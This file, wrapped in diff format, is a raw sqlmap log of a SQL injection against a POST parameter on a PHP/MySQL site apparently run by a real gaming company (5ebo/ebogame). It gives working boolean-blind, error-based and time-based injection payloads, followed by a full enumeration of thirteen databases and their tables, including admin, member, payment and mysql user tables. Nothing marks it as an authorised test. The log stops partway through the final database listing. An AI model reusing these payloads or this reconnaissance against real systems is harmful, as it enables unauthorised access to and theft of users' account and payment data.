@@ -1,0 +1,2092 @@
+sqlmap identified the following injection point(s) with a total of 501 HTTP(s) requests:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+available databases [13]:
+[*] 5ebo
+[*] 5ebo_bbs
+[*] 5ebo_oa
+[*] 5ebo_ucenter
+[*] 5ebo_www
+[*] 5ebo_www_test
+[*] eboedu
+[*] ebogame
+[*] ebogame_1
+[*] information_schema
+[*] my
+[*] mysql
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo_ucenter
+[31 tables]
++---------------------------------------+
+| uc_admins                             |
+| uc_applications                       |
+| uc_badwords                           |
+| uc_domains                            |
+| uc_failedlogins                       |
+| uc_feeds                              |
+| uc_friends                            |
+| uc_mailqueue                          |
+| uc_memberfields                       |
+| uc_members                            |
+| uc_mergemembers                       |
+| uc_newpm                              |
+| uc_notelist                           |
+| uc_pm_indexes                         |
+| uc_pm_lists                           |
+| uc_pm_members                         |
+| uc_pm_messages_0                      |
+| uc_pm_messages_1                      |
+| uc_pm_messages_2                      |
+| uc_pm_messages_3                      |
+| uc_pm_messages_4                      |
+| uc_pm_messages_5                      |
+| uc_pm_messages_6                      |
+| uc_pm_messages_7                      |
+| uc_pm_messages_8                      |
+| uc_pm_messages_9                      |
+| uc_protectedmembers                   |
+| uc_settings                           |
+| uc_sqlcache                           |
+| uc_tags                               |
+| uc_vars                               |
++---------------------------------------+
+
+Database: 5ebo
+[159 tables]
++---------------------------------------+
+| module                                |
+| position                              |
+| session                               |
+| admin                                 |
+| admin_panel                           |
+| admin_role                            |
+| admin_role_priv                       |
+| announce                              |
+| attachment                            |
+| attachment_index                      |
+| badword                               |
+| bbs_actlogs                           |
+| bbs_apclog                            |
+| bbs_beg                               |
+| bbs_bmbcode                           |
+| bbs_contacts                          |
+| bbs_emoticons                         |
+| bbs_favorites                         |
+| bbs_forumdata                         |
+| bbs_gueststat                         |
+| bbs_invite                            |
+| bbs_lastest                           |
+| bbs_levels                            |
+| bbs_onlinestat                        |
+| bbs_polls                             |
+| bbs_posts                             |
+| bbs_potlog                            |
+| bbs_primsg                            |
+| bbs_schedule                          |
+| bbs_search                            |
+| bbs_shareforum                        |
+| bbs_tags                              |
+| bbs_threads                           |
+| bbs_ugoptlist                         |
+| bbs_usergroup                         |
+| bbs_userlist                          |
+| block                                 |
+| block_history                         |
+| block_priv                            |
+| cache                                 |
+| category                              |
+| category_priv                         |
+| collection_content                    |
+| collection_history                    |
+| collection_node                       |
+| collection_program                    |
+| comment                               |
+| comment_check                         |
+| comment_data_1                        |
+| comment_setting                       |
+| comment_table                         |
+| content_check                         |
+| copyfrom                              |
+| datacall                              |
+| dbsource                              |
+| download                              |
+| download_data                         |
+| downservers                           |
+| ebogame_activation                    |
+| ebogame_advertising                   |
+| ebogame_advertising_click             |
+| ebogame_category                      |
+| ebogame_charge                        |
+| ebogame_content                       |
+| ebogame_game_areas                    |
+| ebogame_game_code                     |
+| ebogame_games                         |
+| ebogame_gamezone_info                 |
+| ebogame_gcdiagram                     |
+| ebogame_ggtj                          |
+| ebogame_goods                         |
+| ebogame_haijinjuankg                  |
+| ebogame_integral                      |
+| ebogame_member                        |
+| ebogame_member_char                   |
+| ebogame_member_charvolume             |
+| ebogame_member_info                   |
+| ebogame_member_integral               |
+| ebogame_member_login                  |
+| ebogame_member_price                  |
+| ebogame_member_serv                   |
+| ebogame_member_task                   |
+| ebogame_mzdgdj                        |
+| ebogame_news                          |
+| ebogame_order                         |
+| ebogame_pictures                      |
+| ebogame_price                         |
+| ebogame_question_reply                |
+| ebogame_questions                     |
+| ebogame_task                          |
+| extend_setting                        |
+| favorite                              |
+| hits                                  |
+| ipbanned                              |
+| keylink                               |
+| keyword                               |
+| keyword_data                          |
+| link                                  |
+| linkage                               |
+| log                                   |
+| member                                |
+| member_detail                         |
+| member_group                          |
+| member_menu                           |
+| member_verify                         |
+| member_vip                            |
+| menu                                  |
+| message                               |
+| message_data                          |
+| message_group                         |
+| model                                 |
+| model_field                           |
+| mood                                  |
+| news                                  |
+| news_data                             |
+| page                                  |
+| pay_account                           |
+| pay_payment                           |
+| pay_spend                             |
+| picture                               |
+| picture_data                          |
+| position_data                         |
+| poster                                |
+| poster_201310                         |
+| poster_201401                         |
+| poster_201402                         |
+| poster_201403                         |
+| poster_space                          |
+| queue                                 |
+| release_point                         |
+| search                                |
+| search_keyword                        |
+| site                                  |
+| sms_report                            |
+| special                               |
+| special_c_data                        |
+| special_content                       |
+| sphinx_counter                        |
+| sso_admin                             |
+| sso_applications                      |
+| sso_members                           |
+| sso_messagequeue                      |
+| sso_session                           |
+| sso_settings                          |
+| tag                                   |
+| template_bak                          |
+| times                                 |
+| type                                  |
+| urlrule                               |
+| video                                 |
+| video_content                         |
+| video_data                            |
+| video_store                           |
+| vote_data                             |
+| vote_option                           |
+| vote_subject                          |
+| wap                                   |
+| wap_type                              |
+| workflow                              |
++---------------------------------------+
+
+Database: ebogame
+[338 tables]
++---------------------------------------+
+| api_send_mail                         |
+| bbs_actlogs                           |
+| bbs_apclog                            |
+| bbs_beg                               |
+| bbs_bmbcode                           |
+| bbs_contacts                          |
+| bbs_emoticons                         |
+| bbs_favorites                         |
+| bbs_forumdata                         |
+| bbs_gueststat                         |
+| bbs_invite                            |
+| bbs_lastest                           |
+| bbs_levels                            |
+| bbs_onlinestat                        |
+| bbs_polls                             |
+| bbs_posts                             |
+| bbs_potlog                            |
+| bbs_primsg                            |
+| bbs_schedule                          |
+| bbs_search                            |
+| bbs_shareforum                        |
+| bbs_tags                              |
+| bbs_threads                           |
+| bbs_ugoptlist                         |
+| bbs_usergroup                         |
+| bbs_userlist                          |
+| ebogame_activation                    |
+| ebogame_advertising                   |
+| ebogame_advertising_click             |
+| ebogame_bbs                           |
+| ebogame_bbs_section                   |
+| ebogame_category                      |
+| ebogame_charge                        |
+| ebogame_charge_20160118               |
+| ebogame_charge_bf                     |
+| ebogame_charge_copy                   |
+| ebogame_charge_heepay                 |
+| ebogame_content                       |
+| ebogame_extension                     |
+| ebogame_extension_member              |
+| ebogame_extension_percent             |
+| ebogame_extension_settlemen           |
+| ebogame_extension_settlemen_once      |
+| ebogame_game_areas                    |
+| ebogame_game_code                     |
+| ebogame_game_gift_code                |
+| ebogame_game_gift_code_               |
+| ebogame_game_gift_code_17173          |
+| ebogame_game_gift_info_               |
+| ebogame_game_gift_info_17173          |
+| ebogame_games                         |
+| ebogame_integral                      |
+| ebogame_member                        |
+| ebogame_member_char                   |
+| ebogame_member_info                   |
+| ebogame_member_integral               |
+| ebogame_member_login                  |
+| ebogame_member_price                  |
+| ebogame_member_serv                   |
+| ebogame_news                          |
+| ebogame_pictures                      |
+| ebogame_price                         |
+| ebogame_question_reply                |
+| ebogame_questions                     |
+| pre_common_admincp_cmenu              |
+| pre_common_admincp_group              |
+| pre_common_admincp_member             |
+| pre_common_admincp_perm               |
+| pre_common_admincp_session            |
+| pre_common_admingroup                 |
+| pre_common_adminnote                  |
+| pre_common_advertisement              |
+| pre_common_advertisement_custom       |
+| pre_common_banned                     |
+| pre_common_block                      |
+| pre_common_block_favorite             |
+| pre_common_block_item                 |
+| pre_common_block_item_data            |
+| pre_common_block_permission           |
+| pre_common_block_pic                  |
+| pre_common_block_style                |
+| pre_common_block_xml                  |
+| pre_common_cache                      |
+| pre_common_card                       |
+| pre_common_card_log                   |
+| pre_common_card_type                  |
+| pre_common_connect_guest              |
+| pre_common_credit_log                 |
+| pre_common_credit_rule                |
+| pre_common_credit_rule_log            |
+| pre_common_credit_rule_log_field      |
+| pre_common_cron                       |
+| pre_common_devicetoken                |
+| pre_common_district                   |
+| pre_common_diy_data                   |
+| pre_common_domain                     |
+| pre_common_failedlogin                |
+| pre_common_friendlink                 |
+| pre_common_grouppm                    |
+| pre_common_invite                     |
+| pre_common_magic                      |
+| pre_common_magiclog                   |
+| pre_common_mailcron                   |
+| pre_common_mailqueue                  |
+| pre_common_member                     |
+| pre_common_member_action_log          |
+| pre_common_member_connect             |
+| pre_common_member_count               |
+| pre_common_member_crime               |
+| pre_common_member_field_forum         |
+| pre_common_member_field_home          |
+| pre_common_member_grouppm             |
+| pre_common_member_log                 |
+| pre_common_member_magic               |
+| pre_common_member_medal               |
+| pre_common_member_profile             |
+| pre_common_member_profile_setting     |
+| pre_common_member_security            |
+| pre_common_member_stat_field          |
+| pre_common_member_status              |
+| pre_common_member_validate            |
+| pre_common_member_verify              |
+| pre_common_member_verify_info         |
+| pre_common_myapp                      |
+| pre_common_myinvite                   |
+| pre_common_mytask                     |
+| pre_common_nav                        |
+| pre_common_onlinetime                 |
+| pre_common_patch                      |
+| pre_common_plugin                     |
+| pre_common_pluginvar                  |
+| pre_common_process                    |
+| pre_common_regip                      |
+| pre_common_relatedlink                |
+| pre_common_report                     |
+| pre_common_searchindex                |
+| pre_common_secquestion                |
+| pre_common_session                    |
+| pre_common_setting                    |
+| pre_common_smiley                     |
+| pre_common_sphinxcounter              |
+| pre_common_stat                       |
+| pre_common_statuser                   |
+| pre_common_style                      |
+| pre_common_stylevar                   |
+| pre_common_syscache                   |
+| pre_common_tag                        |
+| pre_common_tagitem                    |
+| pre_common_task                       |
+| pre_common_taskvar                    |
+| pre_common_template                   |
+| pre_common_template_block             |
+| pre_common_template_permission        |
+| pre_common_uin_black                  |
+| pre_common_usergroup                  |
+| pre_common_usergroup_field            |
+| pre_common_word                       |
+| pre_common_word_type                  |
+| pre_connect_disktask                  |
+| pre_connect_feedlog                   |
+| pre_connect_memberbindlog             |
+| pre_connect_postfeedlog               |
+| pre_connect_tthreadlog                |
+| pre_forum_access                      |
+| pre_forum_activity                    |
+| pre_forum_activityapply               |
+| pre_forum_announcement                |
+| pre_forum_attachment                  |
+| pre_forum_attachment_0                |
+| pre_forum_attachment_1                |
+| pre_forum_attachment_2                |
+| pre_forum_attachment_3                |
+| pre_forum_attachment_4                |
+| pre_forum_attachment_5                |
+| pre_forum_attachment_6                |
+| pre_forum_attachment_7                |
+| pre_forum_attachment_8                |
+| pre_forum_attachment_9                |
+| pre_forum_attachment_exif             |
+| pre_forum_attachment_unused           |
+| pre_forum_attachtype                  |
+| pre_forum_bbcode                      |
+| pre_forum_collection                  |
+| pre_forum_collectioncomment           |
+| pre_forum_collectionfollow            |
+| pre_forum_collectioninvite            |
+| pre_forum_collectionrelated           |
+| pre_forum_collectionteamworker        |
+| pre_forum_collectionthread            |
+| pre_forum_creditslog                  |
+| pre_forum_debate                      |
+| pre_forum_debatepost                  |
+| pre_forum_faq                         |
+| pre_forum_forum                       |
+| pre_forum_forum_threadtable           |
+| pre_forum_forumfield                  |
+| pre_forum_forumrecommend              |
+| pre_forum_groupcreditslog             |
+| pre_forum_groupfield                  |
+| pre_forum_groupinvite                 |
+| pre_forum_grouplevel                  |
+| pre_forum_groupuser                   |
+| pre_forum_imagetype                   |
+| pre_forum_medal                       |
+| pre_forum_medallog                    |
+| pre_forum_memberrecommend             |
+| pre_forum_moderator                   |
+| pre_forum_modwork                     |
+| pre_forum_onlinelist                  |
+| pre_forum_order                       |
+| pre_forum_poll                        |
+| pre_forum_polloption                  |
+| pre_forum_pollvoter                   |
+| pre_forum_post                        |
+| pre_forum_post_location               |
+| pre_forum_post_moderate               |
+| pre_forum_post_tableid                |
+| pre_forum_postcache                   |
+| pre_forum_postcomment                 |
+| pre_forum_postlog                     |
+| pre_forum_poststick                   |
+| pre_forum_promotion                   |
+| pre_forum_ratelog                     |
+| pre_forum_relatedthread               |
+| pre_forum_replycredit                 |
+| pre_forum_rsscache                    |
+| pre_forum_spacecache                  |
+| pre_forum_statlog                     |
+| pre_forum_thread                      |
+| pre_forum_thread_moderate             |
+| pre_forum_threadaddviews              |
+| pre_forum_threadclass                 |
+| pre_forum_threadclosed                |
+| pre_forum_threaddisablepos            |
+| pre_forum_threadimage                 |
+| pre_forum_threadlog                   |
+| pre_forum_threadmod                   |
+| pre_forum_threadpartake               |
+| pre_forum_threadpreview               |
+| pre_forum_threadrush                  |
+| pre_forum_threadtype                  |
+| pre_forum_trade                       |
+| pre_forum_tradecomment                |
+| pre_forum_tradelog                    |
+| pre_forum_typeoption                  |
+| pre_forum_typeoptionvar               |
+| pre_forum_typevar                     |
+| pre_forum_warning                     |
+| pre_home_album                        |
+| pre_home_album_category               |
+| pre_home_appcreditlog                 |
+| pre_home_blacklist                    |
+| pre_home_blog                         |
+| pre_home_blog_category                |
+| pre_home_blog_moderate                |
+| pre_home_blogfield                    |
+| pre_home_class                        |
+| pre_home_click                        |
+| pre_home_clickuser                    |
+| pre_home_comment                      |
+| pre_home_comment_moderate             |
+| pre_home_docomment                    |
+| pre_home_doing                        |
+| pre_home_doing_moderate               |
+| pre_home_favorite                     |
+| pre_home_feed                         |
+| pre_home_feed_app                     |
+| pre_home_follow                       |
+| pre_home_follow_feed                  |
+| pre_home_follow_feed_archiver         |
+| pre_home_friend                       |
+| pre_home_friend_request               |
+| pre_home_friendlog                    |
+| pre_home_notification                 |
+| pre_home_pic                          |
+| pre_home_pic_moderate                 |
+| pre_home_picfield                     |
+| pre_home_poke                         |
+| pre_home_pokearchive                  |
+| pre_home_share                        |
+| pre_home_share_moderate               |
+| pre_home_show                         |
+| pre_home_specialuser                  |
+| pre_home_userapp                      |
+| pre_home_userappfield                 |
+| pre_home_visitor                      |
+| pre_mobile_setting                    |
+| pre_portal_article_content            |
+| pre_portal_article_count              |
+| pre_portal_article_moderate           |
+| pre_portal_article_related            |
+| pre_portal_article_title              |
+| pre_portal_article_trash              |
+| pre_portal_attachment                 |
+| pre_portal_category                   |
+| pre_portal_category_permission        |
+| pre_portal_comment                    |
+| pre_portal_comment_moderate           |
+| pre_portal_rsscache                   |
+| pre_portal_topic                      |
+| pre_portal_topic_pic                  |
+| pre_security_evilpost                 |
+| pre_security_eviluser                 |
+| pre_security_failedlog                |
+| pre_ucenter_admins                    |
+| pre_ucenter_applications              |
+| pre_ucenter_badwords                  |
+| pre_ucenter_domains                   |
+| pre_ucenter_failedlogins              |
+| pre_ucenter_feeds                     |
+| pre_ucenter_friends                   |
+| pre_ucenter_mailqueue                 |
+| pre_ucenter_memberfields              |
+| pre_ucenter_members                   |
+| pre_ucenter_mergemembers              |
+| pre_ucenter_newpm                     |
+| pre_ucenter_notelist                  |
+| pre_ucenter_pm_indexes                |
+| pre_ucenter_pm_lists                  |
+| pre_ucenter_pm_members                |
+| pre_ucenter_pm_messages_0             |
+| pre_ucenter_pm_messages_1             |
+| pre_ucenter_pm_messages_2             |
+| pre_ucenter_pm_messages_3             |
+| pre_ucenter_pm_messages_4             |
+| pre_ucenter_pm_messages_5             |
+| pre_ucenter_pm_messages_6             |
+| pre_ucenter_pm_messages_7             |
+| pre_ucenter_pm_messages_8             |
+| pre_ucenter_pm_messages_9             |
+| pre_ucenter_protectedmembers          |
+| pre_ucenter_settings                  |
+| pre_ucenter_sqlcache                  |
+| pre_ucenter_tags                      |
+| pre_ucenter_vars                      |
+| sglj_charge                           |
+| sglj_coin                             |
+| sglj_extension                        |
++---------------------------------------+
+
+Database: eboedu
+[10 tables]
++---------------------------------------+
+| eboedu_advertising                    |
+| eboedu_advertising_click              |
+| eboedu_category                       |
+| eboedu_content                        |
+| eboedu_member                         |
+| eboedu_member_info                    |
+| eboedu_member_log                     |
+| eboedu_news                           |
+| eboedu_pictures                       |
+| eboedu_question                       |
++---------------------------------------+
+
+Database: ebogame_1
+[35 tables]
++---------------------------------------+
+| ebogame_activation                    |
+| ebogame_advertising                   |
+| ebogame_advertising_click             |
+| ebogame_bbs                           |
+| ebogame_bbs_section                   |
+| ebogame_category                      |
+| ebogame_charge                        |
+| ebogame_charge_heepay                 |
+| ebogame_content                       |
+| ebogame_extension                     |
+| ebogame_extension_member              |
+| ebogame_extension_percent             |
+| ebogame_extension_settlemen           |
+| ebogame_extension_settlemen_once      |
+| ebogame_game_areas                    |
+| ebogame_game_code                     |
+| ebogame_game_gift_code                |
+| ebogame_game_gift_code_               |
+| ebogame_game_gift_code_17173          |
+| ebogame_game_gift_info_               |
+| ebogame_game_gift_info_17173          |
+| ebogame_games                         |
+| ebogame_integral                      |
+| ebogame_member                        |
+| ebogame_member_char                   |
+| ebogame_member_info                   |
+| ebogame_member_integral               |
+| ebogame_member_login                  |
+| ebogame_member_price                  |
+| ebogame_member_serv                   |
+| ebogame_news                          |
+| ebogame_pictures                      |
+| ebogame_price                         |
+| ebogame_question_reply                |
+| ebogame_questions                     |
++---------------------------------------+
+
+Database: 5ebo_bbs
+[316 tables]
++---------------------------------------+
+| anhei_activate_num                    |
+| anhei_activate_record                 |
+| anhei_day_received                    |
+| anhei_day_received_limited            |
+| anhei_member                          |
+| anhei_packs_num                       |
+| ebogame_charge                        |
+| ebogame_charge_copy                   |
+| ebogame_charge_total                  |
+| ebogame_media_anomalydata             |
+| ebogame_media_page                    |
+| ebogame_media_page_detail             |
+| ebogame_media_partners                |
+| ebogame_media_setting                 |
+| ebogame_member_findpass               |
+| ebogame_member_info                   |
+| ebogame_member_info_copy              |
+| ebogame_member_money                  |
+| ebogame_orderhistory                  |
+| ebogame_phone_code                    |
+| pre_common_admincp_cmenu              |
+| pre_common_admincp_group              |
+| pre_common_admincp_member             |
+| pre_common_admincp_perm               |
+| pre_common_admincp_session            |
+| pre_common_admingroup                 |
+| pre_common_adminnote                  |
+| pre_common_advertisement              |
+| pre_common_advertisement_custom       |
+| pre_common_banned                     |
+| pre_common_block                      |
+| pre_common_block_favorite             |
+| pre_common_block_item                 |
+| pre_common_block_item_data            |
+| pre_common_block_permission           |
+| pre_common_block_pic                  |
+| pre_common_block_style                |
+| pre_common_block_xml                  |
+| pre_common_cache                      |
+| pre_common_card                       |
+| pre_common_card_log                   |
+| pre_common_card_type                  |
+| pre_common_connect_guest              |
+| pre_common_credit_log                 |
+| pre_common_credit_log_field           |
+| pre_common_credit_rule                |
+| pre_common_credit_rule_log            |
+| pre_common_credit_rule_log_field      |
+| pre_common_cron                       |
+| pre_common_devicetoken                |
+| pre_common_district                   |
+| pre_common_diy_data                   |
+| pre_common_domain                     |
+| pre_common_failedip                   |
+| pre_common_failedlogin                |
+| pre_common_friendlink                 |
+| pre_common_grouppm                    |
+| pre_common_invite                     |
+| pre_common_magic                      |
+| pre_common_magiclog                   |
+| pre_common_mailcron                   |
+| pre_common_mailqueue                  |
+| pre_common_member                     |
+| pre_common_member_action_log          |
+| pre_common_member_archive             |
+| pre_common_member_connect             |
+| pre_common_member_count               |
+| pre_common_member_crime               |
+| pre_common_member_field_forum         |
+| pre_common_member_field_home          |
+| pre_common_member_forum_buylog        |
+| pre_common_member_grouppm             |
+| pre_common_member_log                 |
+| pre_common_member_magic               |
+| pre_common_member_medal               |
+| pre_common_member_newprompt           |
+| pre_common_member_profile             |
+| pre_common_member_profile_setting     |
+| pre_common_member_security            |
+| pre_common_member_secwhite            |
+| pre_common_member_stat_field          |
+| pre_common_member_status              |
+| pre_common_member_temp___             |
+| pre_common_member_validate            |
+| pre_common_member_verify              |
+| pre_common_member_verify_info         |
+| pre_common_myapp                      |
+| pre_common_myinvite                   |
+| pre_common_mytask                     |
+| pre_common_nav                        |
+| pre_common_onlinetime                 |
+| pre_common_optimizer                  |
+| pre_common_patch                      |
+| pre_common_plugin                     |
+| pre_common_pluginvar                  |
+| pre_common_process                    |
+| pre_common_regip                      |
+| pre_common_relatedlink                |
+| pre_common_remote_port                |
+| pre_common_report                     |
+| pre_common_searchindex                |
+| pre_common_seccheck                   |
+| pre_common_secquestion                |
+| pre_common_session                    |
+| pre_common_setting                    |
+| pre_common_smiley                     |
+| pre_common_sphinxcounter              |
+| pre_common_stat                       |
+| pre_common_statuser                   |
+| pre_common_style                      |
+| pre_common_stylevar                   |
+| pre_common_syscache                   |
+| pre_common_tag                        |
+| pre_common_tagitem                    |
+| pre_common_task                       |
+| pre_common_taskvar                    |
+| pre_common_template                   |
+| pre_common_template_block             |
+| pre_common_template_permission        |
+| pre_common_uin_black                  |
+| pre_common_usergroup                  |
+| pre_common_usergroup_field            |
+| pre_common_visit                      |
+| pre_common_word                       |
+| pre_common_word_type                  |
+| pre_connect_disktask                  |
+| pre_connect_feedlog                   |
+| pre_connect_memberbindlog             |
+| pre_connect_postfeedlog               |
+| pre_connect_tthreadlog                |
+| pre_forum_access                      |
+| pre_forum_activity                    |
+| pre_forum_activityapply               |
+| pre_forum_announcement                |
+| pre_forum_attachment                  |
+| pre_forum_attachment_0                |
+| pre_forum_attachment_1                |
+| pre_forum_attachment_2                |
+| pre_forum_attachment_3                |
+| pre_forum_attachment_4                |
+| pre_forum_attachment_5                |
+| pre_forum_attachment_6                |
+| pre_forum_attachment_7                |
+| pre_forum_attachment_8                |
+| pre_forum_attachment_9                |
+| pre_forum_attachment_exif             |
+| pre_forum_attachment_unused           |
+| pre_forum_attachtype                  |
+| pre_forum_bbcode                      |
+| pre_forum_collection                  |
+| pre_forum_collectioncomment           |
+| pre_forum_collectionfollow            |
+| pre_forum_collectioninvite            |
+| pre_forum_collectionrelated           |
+| pre_forum_collectionteamworker        |
+| pre_forum_collectionthread            |
+| pre_forum_creditslog                  |
+| pre_forum_debate                      |
+| pre_forum_debatepost                  |
+| pre_forum_faq                         |
+| pre_forum_filter_post                 |
+| pre_forum_forum                       |
+| pre_forum_forum_threadtable           |
+| pre_forum_forumfield                  |
+| pre_forum_forumrecommend              |
+| pre_forum_groupcreditslog             |
+| pre_forum_groupfield                  |
+| pre_forum_groupinvite                 |
+| pre_forum_grouplevel                  |
+| pre_forum_groupuser                   |
+| pre_forum_hotreply_member             |
+| pre_forum_hotreply_number             |
+| pre_forum_imagetype                   |
+| pre_forum_medal                       |
+| pre_forum_medallog                    |
+| pre_forum_memberrecommend             |
+| pre_forum_moderator                   |
+| pre_forum_modwork                     |
+| pre_forum_newthread                   |
+| pre_forum_onlinelist                  |
+| pre_forum_order                       |
+| pre_forum_poll                        |
+| pre_forum_polloption                  |
+| pre_forum_polloption_image            |
+| pre_forum_pollvoter                   |
+| pre_forum_post                        |
+| pre_forum_post_location               |
+| pre_forum_post_moderate               |
+| pre_forum_post_tableid                |
+| pre_forum_postcache                   |
+| pre_forum_postcomment                 |
+| pre_forum_postlog                     |
+| pre_forum_poststick                   |
+| pre_forum_promotion                   |
+| pre_forum_ratelog                     |
+| pre_forum_relatedthread               |
+| pre_forum_replycredit                 |
+| pre_forum_rsscache                    |
+| pre_forum_sofa                        |
+| pre_forum_spacecache                  |
+| pre_forum_statlog                     |
+| pre_forum_thread                      |
+| pre_forum_thread_moderate             |
+| pre_forum_threadaddviews              |
+| pre_forum_threadcalendar              |
+| pre_forum_threadclass                 |
+| pre_forum_threadclosed                |
+| pre_forum_threaddisablepos            |
+| pre_forum_threadhidelog               |
+| pre_forum_threadhot                   |
+| pre_forum_threadimage                 |
+| pre_forum_threadlog                   |
+| pre_forum_threadmod                   |
+| pre_forum_threadpartake               |
+| pre_forum_threadpreview               |
+| pre_forum_threadprofile               |
+| pre_forum_threadprofile_group         |
+| pre_forum_threadrush                  |
+| pre_forum_threadtype                  |
+| pre_forum_trade                       |
+| pre_forum_tradecomment                |
+| pre_forum_tradelog                    |
+| pre_forum_typeoption                  |
+| pre_forum_typeoptionvar               |
+| pre_forum_typevar                     |
+| pre_forum_warning                     |
+| pre_home_album                        |
+| pre_home_album_category               |
+| pre_home_appcreditlog                 |
+| pre_home_blacklist                    |
+| pre_home_blog                         |
+| pre_home_blog_category                |
+| pre_home_blog_moderate                |
+| pre_home_blogfield                    |
+| pre_home_class                        |
+| pre_home_click                        |
+| pre_home_clickuser                    |
+| pre_home_comment                      |
+| pre_home_comment_moderate             |
+| pre_home_docomment                    |
+| pre_home_doing                        |
+| pre_home_doing_moderate               |
+| pre_home_favorite                     |
+| pre_home_feed                         |
+| pre_home_feed_app                     |
+| pre_home_follow                       |
+| pre_home_follow_feed                  |
+| pre_home_follow_feed_archiver         |
+| pre_home_friend                       |
+| pre_home_friend_request               |
+| pre_home_friendlog                    |
+| pre_home_notification                 |
+| pre_home_pic                          |
+| pre_home_pic_moderate                 |
+| pre_home_picfield                     |
+| pre_home_poke                         |
+| pre_home_pokearchive                  |
+| pre_home_share                        |
+| pre_home_share_moderate               |
+| pre_home_show                         |
+| pre_home_specialuser                  |
+| pre_home_userapp                      |
+| pre_home_userappfield                 |
+| pre_home_visitor                      |
+| pre_mobile_setting                    |
+| pre_mobileoem_member                  |
+| pre_mobileoem_pushthreads             |
+| pre_portal_article_content            |
+| pre_portal_article_count              |
+| pre_portal_article_moderate           |
+| pre_portal_article_related            |
+| pre_portal_article_title              |
+| pre_portal_article_trash              |
+| pre_portal_attachment                 |
+| pre_portal_category                   |
+| pre_portal_category_permission        |
+| pre_portal_comment                    |
+| pre_portal_comment_moderate           |
+| pre_portal_rsscache                   |
+| pre_portal_topic                      |
+| pre_portal_topic_pic                  |
+| pre_qqy_ltnclog                       |
+| pre_security_evilpost                 |
+| pre_security_eviluser                 |
+| pre_security_failedlog                |
+| pre_ucenter_admins                    |
+| pre_ucenter_applications              |
+| pre_ucenter_badwords                  |
+| pre_ucenter_domains                   |
+| pre_ucenter_failedlogins              |
+| pre_ucenter_feeds                     |
+| pre_ucenter_friends                   |
+| pre_ucenter_mailqueue                 |
+| pre_ucenter_memberfields              |
+| pre_ucenter_members                   |
+| pre_ucenter_mergemembers              |
+| pre_ucenter_newpm                     |
+| pre_ucenter_notelist                  |
+| pre_ucenter_pm_indexes                |
+| pre_ucenter_pm_lists                  |
+| pre_ucenter_pm_members                |
+| pre_ucenter_pm_messages_0             |
+| pre_ucenter_pm_messages_1             |
+| pre_ucenter_pm_messages_2             |
+| pre_ucenter_pm_messages_3             |
+| pre_ucenter_pm_messages_4             |
+| pre_ucenter_pm_messages_5             |
+| pre_ucenter_pm_messages_6             |
+| pre_ucenter_pm_messages_7             |
+| pre_ucenter_pm_messages_8             |
+| pre_ucenter_pm_messages_9             |
+| pre_ucenter_protectedmembers          |
+| pre_ucenter_settings                  |
+| pre_ucenter_sqlcache                  |
+| pre_ucenter_tags                      |
+| pre_ucenter_vars                      |
++---------------------------------------+
+
+Database: 5ebo_oa
+[19 tables]
++---------------------------------------+
+| oa_access                             |
+| oa_department                         |
+| oa_department_member                  |
+| oa_goout                              |
+| oa_goout_data                         |
+| oa_goout_review                       |
+| oa_member                             |
+| oa_node                               |
+| oa_personneldata_bak                  |
+| oa_position                           |
+| oa_purchase                           |
+| oa_purchase_data                      |
+| oa_purchase_review                    |
+| oa_requests                           |
+| oa_requests_review                    |
+| oa_setting                            |
+| oa_travel                             |
+| oa_travel_data                        |
+| oa_travel_review                      |
++---------------------------------------+
+
+Database: mysql
+[23 tables]
++---------------------------------------+
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| event                                 |
+| func                                  |
+| general_log                           |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| host                                  |
+| ndb_binlog_index                      |
+| plugin                                |
+| proc                                  |
+| procs_priv                            |
+| servers                               |
+| slow_log                              |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: test
+[4 tables]
++---------------------------------------+
+| ebo_user                              |
+| qq_sid                                |
+| v9_news                               |
+| v9_news_data                          |
++---------------------------------------+
+
+Database: 5ebo_www_test
+[12 tables]
++---------------------------------------+
+| accountlogin_1                        |
+| accountlogin_2                        |
+| accountlogin_3                        |
+| collectonlineplayer_1                 |
+| collectonlineplayer_2                 |
+| collectonlineplayer_3                 |
+| playerlevelup_1                       |
+| playerlevelup_2                       |
+| playerlevelup_3                       |
+| rolelogout_1                          |
+| rolelogout_2                          |
+| rolelogout_3                          |
++---------------------------------------+
+
+Database: my
+[95 tables]
++---------------------------------------+
